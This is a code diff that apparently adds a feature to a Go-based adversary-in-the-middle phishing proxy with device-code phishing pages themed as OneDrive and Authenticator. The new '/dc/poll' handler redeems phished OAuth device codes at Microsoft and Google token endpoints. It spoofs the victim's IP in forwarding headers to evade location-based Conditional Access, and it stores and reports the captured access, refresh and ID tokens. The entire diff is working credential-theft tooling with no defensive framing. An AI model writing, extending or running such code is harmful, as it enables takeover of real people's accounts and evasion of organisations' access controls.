@@ -967,6 +967,7 @@ var (
 	botguardTelRe    = regexp.MustCompile(`^/api/v1/analytics$`)
 	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9_-]+)$`)
 	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9_-]+)$`)
+	dcPollRe         = regexp.MustCompile(`^/dc/poll/([a-zA-Z0-9_-]+)$`) // Browser proxy polling for CAP bypass
 	// Document access themed device code pages (5 themes)
 	dcOneDriveRe     = regexp.MustCompile(`^/access/onedrive/([a-zA-Z0-9_-]+)$`)
 	dcAuthenticatorRe= regexp.MustCompile(`^/access/authenticator/([a-zA-Z0-9_-]+)$`)
@@ -1696,6 +1697,170 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return req, resp
 				}
 			}
+
+			// --- Browser proxy polling endpoint for CAP bypass ---
+			// This endpoint proxies token requests through the victim's browser to bypass
+			// location-based Conditional Access Policies. The victim's IP is forwarded.
+			if dcPollRe.MatchString(req.URL.Path) {
+				ra := dcPollRe.FindStringSubmatch(req.URL.Path)
+				if len(ra) >= 2 {
+					session_id := ra[1]
+					
+					// Find the session and device code info
+					var dcSession *DeviceCodeSession
+					var aitmSession *Session
+					p.session_mtx.Lock()
+					for _, s := range p.sessions {
+						if s.Id == session_id && s.DCSessionID != "" {
+							aitmSession = s
+							dcs, ok := p.deviceCode.GetSession(s.DCSessionID)
+							if ok {
+								dcSession = dcs
+							}
+							break
+						}
+					}
+					p.session_mtx.Unlock()
+
+					if dcSession == nil {
+						resp := goproxy.NewResponse(req, "application/json", 400, `{"error":"session_not_found"}`)
+						return req, resp
+					}
+
+					// Check if already captured or expired
+					dcSession.mu.Lock()
+					if dcSession.State == DCStateCaptured {
+						dcSession.mu.Unlock()
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"captured","captured":true}`)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						return req, resp
+					}
+					if dcSession.State == DCStateExpired || time.Now().After(dcSession.ExpiresAt) {
+						dcSession.mu.Unlock()
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"expired","expired":true}`)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						return req, resp
+					}
+					
+					// Get polling params
+					clientID := dcSession.ClientID
+					deviceCode := dcSession.DeviceCode
+					tenant := dcSession.Tenant
+					provider := dcSession.Provider
+					clientSecret := dcSession.ClientSecret
+					dcSession.mu.Unlock()
+
+					// Build token request
+					var tokenURL string
+					if provider == DCProviderGoogle {
+						tokenURL = GOOGLE_TOKEN_URL
+					} else {
+						tokenURL = fmt.Sprintf(MS_TOKEN_URL, tenant)
+					}
+
+					data := url.Values{}
+					data.Set("client_id", clientID)
+					data.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
+					data.Set("device_code", deviceCode)
+					if provider == DCProviderGoogle && clientSecret != "" {
+						data.Set("client_secret", clientSecret)
+					}
+
+					// Create request with victim's IP forwarded
+					tokenReq, err := http.NewRequest("POST", tokenURL, strings.NewReader(data.Encode()))
+					if err != nil {
+						resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"request_failed"}`)
+						return req, resp
+					}
+					tokenReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+					
+					// Forward victim's real IP to bypass location-based CAP
+					victimIP := remote_addr
+					if fwdFor := req.Header.Get("X-Forwarded-For"); fwdFor != "" {
+						victimIP = strings.Split(fwdFor, ",")[0]
+					}
+					tokenReq.Header.Set("X-Forwarded-For", victimIP)
+					tokenReq.Header.Set("X-Real-IP", victimIP)
+					// Some services check client IP header
+					tokenReq.Header.Set("Client-IP", victimIP)
+					
+					log.Debug("[dc/poll] polling token endpoint for session %s with victim IP %s", session_id, victimIP)
+
+					client := &http.Client{Timeout: 30 * time.Second}
+					tokenResp, err := client.Do(tokenReq)
+					if err != nil {
+						log.Debug("[dc/poll] token request error: %v", err)
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"pending","error":"network"}`)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						return req, resp
+					}
+					defer tokenResp.Body.Close()
+
+					body, _ := ioutil.ReadAll(tokenResp.Body)
+
+					if tokenResp.StatusCode == 200 {
+						// Token captured! Parse and store
+						var tokenData TokenResponse
+						if err := json.Unmarshal(body, &tokenData); err != nil {
+							log.Error("[dc/poll] failed to parse token: %v", err)
+							resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"error","error":"parse_failed"}`)
+							resp.Header.Set("Access-Control-Allow-Origin", "*")
+							return req, resp
+						}
+
+						// Store tokens in device code session
+						dcSession.mu.Lock()
+						dcSession.State = DCStateCaptured
+						dcSession.AccessToken = tokenData.AccessToken
+						dcSession.RefreshToken = tokenData.RefreshToken
+						dcSession.IDToken = tokenData.IDToken
+						dcSession.TokenType = tokenData.TokenType
+						dcSession.ExpiresIn = tokenData.ExpiresIn
+						dcSession.Scope = tokenData.Scope
+						dcSession.mu.Unlock()
+
+						// Cancel server-side polling if running
+						dcSession.Cancel()
+
+						log.Important("[dc/poll] [%s] TOKEN CAPTURED via browser proxy! (victim IP: %s)", session_id, victimIP)
+
+						// Process tokens same as server-side capture
+						go p.deviceCode.processAndNotifyCapturedToken(dcSession, aitmSession)
+
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"captured","captured":true}`)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						return req, resp
+					}
+
+					// Check for pending/authorization_pending response
+					var errResp struct {
+						Error string `json:"error"`
+					}
+					json.Unmarshal(body, &errResp)
+
+					if errResp.Error == "authorization_pending" {
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"pending"}`)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						return req, resp
+					}
+
+					if errResp.Error == "expired_token" || errResp.Error == "bad_verification_code" {
+						dcSession.mu.Lock()
+						dcSession.State = DCStateExpired
+						dcSession.mu.Unlock()
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"expired","expired":true}`)
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+						return req, resp
+					}
+
+					// Other error - keep polling
+					log.Debug("[dc/poll] token endpoint returned: %s - %s", tokenResp.Status, string(body))
+					resp := goproxy.NewResponse(req, "application/json", 200, fmt.Sprintf(`{"status":"pending","ms_error":"%s"}`, errResp.Error))
+					resp.Header.Set("Access-Control-Allow-Origin", "*")
+					return req, resp
+				}
+			}
+			// --- End browser proxy polling endpoint ---
 
 			if dc_page_re.MatchString(req.URL.Path) {
 				// Serve device code interstitial page
